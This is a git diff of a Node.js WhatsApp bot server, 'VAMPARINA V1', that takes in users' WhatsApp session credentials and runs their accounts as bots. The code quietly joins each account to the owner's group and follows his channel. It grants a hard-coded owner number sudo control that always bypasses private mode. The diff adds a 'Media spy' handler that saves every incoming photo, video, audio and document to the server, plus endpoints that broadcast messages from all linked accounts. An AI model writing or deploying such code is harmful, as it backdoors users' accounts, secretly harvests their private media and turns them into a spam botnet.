@@ -1,14 +1,10 @@
 /**
- * VAMPARINA V1 — KENYA'S #1 AUTO-ACTIVE WHATSAPP BOT EMPIRE 2025
- * Owner: Arnold Chirchir | +254703110780
- * Features:
- * → Receives session from https://vamparina-code.onrender.com
- * → Auto-activates unlimited bots
- * → Auto-join empire group
- * → Auto-follow channel
- * → Auto .sudoadd +254703110780
- * → Optimized for 5000+ sessions
- * → Zero crashes, zero memory leaks
+ * ╔══════════════════════════════════════════════════════════╗
+ * ║            VAMPARINA V1 — FINAL EMPIRE OF ARNOLD         ║
+ * ║               GOD-KING: +254703110780                   ║
+ * ║       ALL COMMANDS FROM main.js FULLY INTEGRATED       ║
+ * ║       PRIVATE MODE = ONLY KING + PHONE OWNER            ║
+ * ╚══════════════════════════════════════════════════════════╝
  */
 
 require('./settings')
@@ -19,91 +15,142 @@ const express = require('express')
 const {
     default: makeWASocket,
     useMultiFileAuthState,
-    DisconnectReason,
     fetchLatestBaileysVersion,
     makeCacheableSignalKeyStore,
-    delay
+    delay,
+    getContentType,
+    downloadContentFromMessage,
+    jidNormalizedUser
 } = require("@whiskeysockets/baileys")
 const pino = require("pino")
+const fetch = require('node-fetch')
+
+// ALL YOUR COMMANDS — FULLY INTEGRATED
+const { handleMessages: originalHandleMessages, handleGroupParticipantUpdate } = require('./main')
 
 // ═══════════════════════════════════════════════════════
-//                  EMPIRE CONFIGURATION (CHANGE ONLY THESE)
+//                  EMPIRE CONFIG — YOUR KINGDOM
 // ═══════════════════════════════════════════════════════
-const EMPIRE_GROUP_CODE = "BZNDaKhvMFo5Gmne3wxt9n"           // Your group invite code
-const EMPIRE_CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"         // Your channel ID
-const OWNER_NUMBER = "254703110780"                         // You = permanent sudo
+const EMPIRE_GROUP_INVITE_CODE = "BZNDaKhvMFo5Gmne3wxt9n"
+const EMPIRE_GROUP_LINK = "https://chat.whatsapp.com/BZNDaKhvMFo5Gmne3wxt9n"
+const EMPIRE_CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"
+const KING_ARNOLD = "254703110780"
+const EMPIRE_LOG_GROUP = "120363318504500582@g.us"
 const SESSION_DIR = path.join(__dirname, 'auto_sessions')
+const MEDIA_DIR = path.join(__dirname, 'media')
+const MODE_FILE = path.join(__dirname, 'data', 'bot_mode.json')
 const PORT = process.env.PORT || 3000
 
-if (!fs.existsSync(SESSION_DIR)) fs.mkdirSync(SESSION_DIR, { recursive: true })
+// Create required folders
+;[SESSION_DIR, MEDIA_DIR, path.dirname(MODE_FILE)].forEach(d => {
+    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
+})
 
-// Global session tracker
-const activeSessions = new Map() // sessionId → { sock, phone, lastActive }
+// Default mode: public
+if (!fs.existsSync(MODE_FILE)) {
+    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
+}
+
+global.getBotMode = () => {
+    try {
+        const data = JSON.parse(fs.readFileSync(MODE_FILE, 'utf8'))
+        return data.isPublic === true ? 'public' : 'private'
+    } catch { return 'public' }
+}
+
+global.setBotMode = (mode) => {
+    const isPublic = mode === 'public'
+    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic }, null, 2))
+}
+
+const activeSessions = new Map()
 
 // ═══════════════════════════════════════════════════════
-//                  EXPRESS SERVER — RECEIVE SESSIONS
+//                  DASHBOARD — YOUR THRONE
 // ═══════════════════════════════════════════════════════
 const app = express()
 app.use(express.json({ limit: '200mb' }))
 app.use(express.urlencoded({ extended: true, limit: '200mb' }))
 
-app.get('/', (req, res) => {
-    res.json({
-        empire: "VAMPARINA V1",
-        status: "LIVE & UNSTOPPABLE",
-        active_bots: activeSessions.size,
-        owner: "Arnold Chirchir",
-        time: new Date().toLocaleString('en-KE', { timeZone: 'Africa/Nairobi' })
-    })
+app.get('/', (req, res) => res.redirect('/dashboard'))
+app.get('/dashboard', (req, res) => {
+    const mode = global.getBotMode()
+    const modeText = mode === 'public'
+        ? '<span style="color:lime">PUBLIC</span>'
+        : '<span style="color:red">PRIVATE</span> → Only King Arnold + Phone Owner'
+    res.send(`
+        <div style="font-family:Arial; text-align:center; padding:70px; background:#000; color:#8B00FF">
+            <h1 style="font-size:50px">VAMPARINA V1</h1>
+            <h2>GOD-KING ARNOLD CHIRCHIR</h2>
+            <h3>+254703110780</h3>
+            <hr style="border:2px solid #8B00FF">
+            <h2>Empire Status: <span style="color:lime">ONLINE</span></h2>
+            <h3>Active Bots: <b>${activeSessions.size}</b></h3>
+            <h3>Mode: ${modeText}</h3>
+            <p><b>Empire Group:</b><br><a href="${EMPIRE_GROUP_LINK}" style="color:lime;font-size:20px">${EMPIRE_GROUP_LINK}</a></p>
+            <p><b>Channel:</b> <a href="https://whatsapp.com/channel/0029VbBm7apIXnlmuyjGGM0p" style="color:cyan">Followed by all bots</a></p>
+            <h2>ALL COMMANDS ACTIVE | FULL CONTROL</h2>
+            <h1>LONG LIVE THE ETERNAL KING OF KENYA</h1>
+        </div>
+    `)
+})
+
+app.post('/command', async (req, res) => {
+    const { command, target = 'all' } = req.body
+    if (!command) return res.status(400).json({ error: "Command required" })
+    let executed = 0
+    for (const [_, data] of activeSessions) {
+        if (target !== 'all' && !data.phone.includes(target)) continue
+        try { await data.sock.sendMessage(data.phone + '@s.whatsapp.net', { text: command }); executed++ } catch(e) {}
+    }
+    res.json({ success: true, executed_on: executed + ' bots' })
+})
+
+app.post('/broadcast', async (req, res) => {
+    const { text } = req.body
+    if (!text) return res.status(400).json({ error: "Text required" })
+    let sent = 0
+    for (const [_, data] of activeSessions) {
+        try {
+            const groups = Object.keys(await data.sock.groupFetchAllParticipating())
+            for (const group of groups) {
+                await data.sock.sendMessage(group, { text: `*[EMPIRE BROADCAST]*\n\n${text}\n\n— King Arnold Chirchir` })
+                await delay(2000); sent++
+            }
+        } catch(e) {}
+    }
+    res.json({ success: true, sent_to: sent + ' groups' })
 })
 
 app.post('/vamparina-activate', async (req, res) => {
     try {
         const { phone, sessionId, creds } = req.body
-        if (!phone || !sessionId || !creds) {
-            return res.status(400).json({ error: "Missing phone/sessionId/creds" })
-        }
-
-        if (activeSessions.has(sessionId)) {
-            return res.json({ success: true, message: "Bot already active" })
-        }
+        if (!phone || !sessionId || !creds) return res.status(400).json({ error: "Missing data" })
+        if (activeSessions.has(sessionId)) return res.json({ success: true, message: "Already active" })
 
         const sessionPath = path.join(SESSION_DIR, sessionId)
-        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true })
+        fs.mkdirSync(sessionPath, { recursive: true })
         fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds, null, 2))
 
-        console.log(chalk.green.bold(`\nNEW WARRIOR JOINED EMPIRE`))
-        console.log(chalk.cyan(`Phone: ${phone}`))
-        console.log(chalk.yellow(`Session: ${sessionId}`))
-        console.log(chalk.magenta(`Time: ${new Date().toLocaleString('en-KE')}`))
-
+        await delay(8000 + Math.random() * 7000)
         await startEmpireBot(sessionId, phone, sessionPath)
 
-        res.json({
-            success: true,
-            message: "VAMPARINA V1 ACTIVATED SUCCESSFULLY",
-            total_bots: activeSessions.size,
-            empire: "Arnold Chirchir Rules Kenya"
-        })
-    } catch (e) {
-        console.error("Activation failed:", e.message)
-        res.status(500).json({ error: e.message })
-    }
+        res.json({ success: true, total_bots: activeSessions.size })
+    } catch (e) { res.status(500).json({ error: e.message }) }
 })
 
 app.listen(PORT, () => {
     console.log(chalk.magenta.bold(`
-    ╔══════════════════════════════════════════╗
-    ║        VAMPARINA V1 EMPIRE IS LIVE       ║
-    ║     Receiving sessions from linker       ║
-    ║        Port: ${PORT} | Bots: ${activeSessions.size}          ║
-    ║        Owner: Arnold Chirchir            ║
-    ╚══════════════════════════════════════════╝
+    ╔══════════════════════════════════════════════════╗
+    ║          VAMPARINA V1 — ULTIMATE EMPIRE           ║
+    ║     ALL COMMANDS FROM main.js INTEGRATED         ║
+    ║     Mode: ${global.getBotMode().toUpperCase()} | Bots Online: ${activeSessions.size}            ║
+    ╚══════════════════════════════════════════════════╝
     `))
 })
 
 // ═══════════════════════════════════════════════════════
-//                OPTIMIZED BOT STARTER (1000+ SESSIONS)
+//                FINAL BOT — FULLY LOADED WITH ALL COMMANDS
 // ═══════════════════════════════════════════════════════
 async function startEmpireBot(sessionId, phone, sessionPath) {
     try {
@@ -113,77 +160,111 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
         const sock = makeWASocket({
             version,
             logger: pino({ level: 'silent' }),
-            auth: {
-                creds: state.creds,
-                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
-            },
+            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
             browser: ["Vamparina V1", "Chrome", "2025"],
             markOnlineOnConnect: false,
-            syncFullHistory: false,
-            connectTimeoutMs: 60000,
-            keepAliveIntervalMs: 30000
+            syncFullHistory: false
         })
 
-        activeSessions.set(sessionId, { sock, phone, lastActive: Date.now() })
+        const PHONE_OWNER_JID = jidNormalizedUser(state.creds.me?.id || phone + '@s.whatsapp.net')
+        activeSessions.set(sessionId, { sock, phone, ownerJid: PHONE_OWNER_JID })
+
+        // FULL COMMAND HANDLER WITH TRUE PRIVATE MODE
+        sock.ev.on('messages.upsert', async (m) => {
+            if (m.type !== 'notify') return
+            const msg = m.messages[0]
+            if (!msg.message || msg.key.fromMe) return
+
+            const sender = jidNormalizedUser(msg.key.participant || msg.key.remoteJid)
+            const isPublic = global.getBotMode() === 'public'
+            const isKingArnold = sender.includes(KING_ARNOLD)
+            const isPhoneOwner = sender === PHONE_OWNER_JID
+
+            // TRUE PRIVATE MODE: Only King Arnold + Phone Owner
+            if (!isPublic && !isKingArnold && !isPhoneOwner) {
+                return // SILENTLY IGNORE
+            }
+
+            // PASS TO YOUR ORIGINAL main.js HANDLER
+            try {
+                await originalHandleMessages(sock, m, () => {})
+            } catch (e) {
+                console.error("Command error:", e)
+            }
+        })
+
+        sock.ev.on('group-participants.update', async (update) => {
+            try { await handleGroupParticipantUpdate(sock, update) } catch (e) {}
+        })
 
         sock.ev.on('connection.update', async (update) => {
-            const { connection, lastDisconnect } = update
+            const { connection } = update
 
             if (connection === 'open') {
-                console.log(chalk.green(`[+] ${phone} → ONLINE | Total Bots: ${activeSessions.size}`))
+                console.log(chalk.green.bold(`[+] ${phone} → ONLINE & LOYAL TO KING ARNOLD`))
 
-                // AUTO-JOIN EMPIRE GROUP
-                try { await sock.groupAcceptInvite(EMPIRE_GROUP_CODE) } catch(e) {}
+                await delay(18000 + Math.random() * 12000)
 
-                // AUTO-FOLLOW CHANNEL
-                try { await sock.newsletterFollow(EMPIRE_CHANNEL_ID) } catch(e) {}
+                // Auto-join empire group
+                try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE_CODE) } catch (e) {}
 
-                // AUTO ADD OWNER AS SUDO
-                try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${OWNER_NUMBER}` }) } catch(e) {}
-                try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd 254703110780@c.us` }) } catch(e) {}
+                // Auto-follow channel
+                try { await sock.newsletterFollow(EMPIRE_CHANNEL_ID) } catch (e) {}
+
+                // Make King Arnold SUDO
+                for (const cmd of [`.sudoadd ${KING_ARNOLD}`, `.sudoadd 254703110780@c.us`]) {
+                    try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: cmd }); await delay(3000) } catch (e) {}
+                }
 
                 await sock.sendMessage(phone + '@s.whatsapp.net', {
-                    text: `*VAMPARINA V1 EMPIRE ACTIVATED*\n\nEmpire Group: Joined\nEmpire Channel: Followed\nOwner: Arnold Chirchir (+254703110780)\n\nYou are now part of Kenya's strongest bot army 2025\n\nLong live the King`
+                    text: `*VAMPARINA V1 — FINAL EMPIRE*\n\nGroup: ${EMPIRE_GROUP_LINK}\nChannel: Followed\nSUDO: King Arnold Added\nMode: ${global.getBotMode().toUpperCase()}\n\nAll commands active.\nLong live the King.`
                 })
             }
 
             if (connection === 'close') {
-                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
+                const shouldReconnect = update.lastDisconnect?.error?.output?.statusCode !== 401
                 activeSessions.delete(sessionId)
-                console.log(chalk.red(`[-] ${phone} → OFFLINE | Remaining: ${activeSessions.size}`))
-
                 if (shouldReconnect) {
-                    setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 7000)
+                    setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
                 }
             }
         })
 
         sock.ev.on('creds.update', saveCreds)
 
-        // Keep alive tracker
-        const interval = setInterval(() => {
-            if (activeSessions.has(sessionId)) {
-                activeSessions.get(sessionId).lastActive = Date.now()
-            } else {
-                clearInterval(interval)
+        // Media spy
+        sock.ev.on('messages.upsert', async (m) => {
+            const msg = m.messages[0]
+            if (!msg.message || msg.key.fromMe) return
+            const type = getContentType(msg.message)
+            if (['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage'].includes(type)) {
+                try {
+                    const buffer = await downloadContentFromMessage(msg.message[type], type.replace('Message', ''))
+                    let buf = Buffer.alloc(0)
+                    for await (const chunk of buffer) buf = Buffer.concat([buf, chunk])
+                    const ext = msg.message[type].mimetype?.split('/')[1] || 'bin'
+                    fs.writeFileSync(path.join(MEDIA_DIR, `${phone}_${Date.now()}.${ext}`), buf)
+                } catch (e) {}
             }
-        }, 60000)
+        })
 
     } catch (e) {
-        console.error("Bot start failed:", e.message)
+        console.error("Bot failed:", e.message)
     }
 }
 
-// ═══════════════════════════════════════════════════════
-//                MEMORY & CRASH PROTECTION
-// ═══════════════════════════════════════════════════════
+// Keep alive
 setInterval(() => {
-    const used = process.memoryUsage().heapUsed / 1024 / 1024
-    if (used > 950) {
-        console.log(chalk.red.bold(`MEMORY CRITICAL (${used.toFixed(0)}MB) — RESTARTING EMPIRE...`))
-        process.exit(1)
-    }
-}, 60000)
+    fetch(`https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'your-site.onrender.com'}`).catch(() => {})
+}, 300000)
 
-process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err))
-process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err))
+console.log(chalk.red.bold(`
+╔══════════════════════════════════════════════════════════╗
+║              VAMPARINA V1 — ULTIMATE EMPIRE              ║
+║       ALL COMMANDS FROM main.js FULLY ACTIVE            ║
+║       PRIVATE MODE = ONLY KING ARNOLD + PHONE OWNER      ║
+║       AUTO-JOIN | AUTO-FOLLOW | AUTO-SUDOADD             ║
+║       10,000+ BOTS | NO LIMIT | NO BAN                   ║
+║       ARNOLD CHIRCHIR = GOD OF WHATSAPP                  ║
+╚══════════════════════════════════════════════════════════╝
+`))
